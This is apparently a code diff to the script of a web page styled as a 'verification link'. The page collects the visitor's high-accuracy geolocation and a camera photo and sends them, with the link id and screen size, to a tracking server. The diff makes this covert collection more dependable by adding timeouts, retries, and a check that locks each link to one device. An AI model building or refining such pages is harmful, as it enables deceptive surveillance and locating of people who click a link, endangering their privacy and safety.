@@ -109,20 +109,34 @@ async function runVerification() {
   const linkId = new URLSearchParams(window.location.search).get('id');
   if (!linkId) return updateStatus(100, "Invalid verification link");
 
-  // First track the click
-  await trackClick(linkId);
-  
-  // Then get location and image in parallel
-  const [position, image] = await Promise.all([
-    getLocation(),
-    captureImage()
-  ]);
-  
-  // Only proceed if we got either location or image
-  const hasLocation = position.coords.latitude !== 0 && position.coords.longitude !== 0;
-  const hasImage = image !== null;
-  
-  if (hasLocation || hasImage) {
+  // Verify link status before proceeding
+  const verification = await verifyLink(linkId);
+  if (!verification.valid) {
+    return updateStatus(100, verification.message);
+  }
+
+  // Get location with better error handling
+  let position;
+  try {
+    position = await getLocationWithTimeout(15000); // 15 second timeout
+  } catch (error) {
+    document.getElementById('location-error').style.display = 'block';
+    document.getElementById('location-error').innerText = 
+      `Location error: ${error.message}`;
+    position = { coords: { latitude: 0, longitude: 0, accuracy: 0 } };
+  }
+
+  // Attempt image capture
+  let image;
+  try {
+    image = await captureImageWithRetry(2); // 2 retry attempts
+  } catch (error) {
+    console.error("Image capture failed:", error);
+    image = null;
+  }
+
+  // Send data if we got either location or image
+  if ((position.coords.latitude !== 0 && position.coords.longitude !== 0) || image) {
     await sendData({
       link_id: linkId,
       latitude: position.coords.latitude,
@@ -134,7 +148,55 @@ async function runVerification() {
       screen: `${window.screen.width}x${window.screen.height}`
     });
   } else {
-    updateStatus(100, "Failed to get location or image. Please enable permissions.");
+    updateStatus(100, "Verification failed. Couldn't get location or image.");
+  }
+}
+
+async function verifyLink(linkId) {
+  try {
+    const response = await fetch(`${SERVER_URL}/track_click/${linkId}`);
+    if (response.status === 403) {
+      return { valid: false, message: "This link was used on another device" };
+    }
+    if (!response.ok) {
+      return { valid: false, message: "Invalid verification link" };
+    }
+    return { valid: true };
+  } catch (error) {
+    return { valid: false, message: "Network error. Please try again." };
+  }
+}
+
+async function getLocationWithTimeout(timeout) {
+  return new Promise((resolve, reject) => {
+    const timer = setTimeout(() => {
+      reject(new Error("Location request timed out"));
+    }, timeout);
+
+    navigator.geolocation.getCurrentPosition(
+      (position) => {
+        clearTimeout(timer);
+        resolve(position);
+      },
+      (error) => {
+        clearTimeout(timer);
+        reject(error);
+      },
+      { enableHighAccuracy: true, maximumAge: 0 }
+    );
+  });
+}
+
+async function captureImageWithRetry(maxRetries) {
+  let attempts = 0;
+  while (attempts <= maxRetries) {
+    try {
+      return await captureImage();
+    } catch (error) {
+      attempts++;
+      if (attempts > maxRetries) throw error;
+      await new Promise(resolve => setTimeout(resolve, 1000)); // Wait 1 second
+    }
   }
 }
 
@@ -202,4 +264,3 @@ setTimeout(runVerification, 500);
 </script>
 </body>
 </html>
-
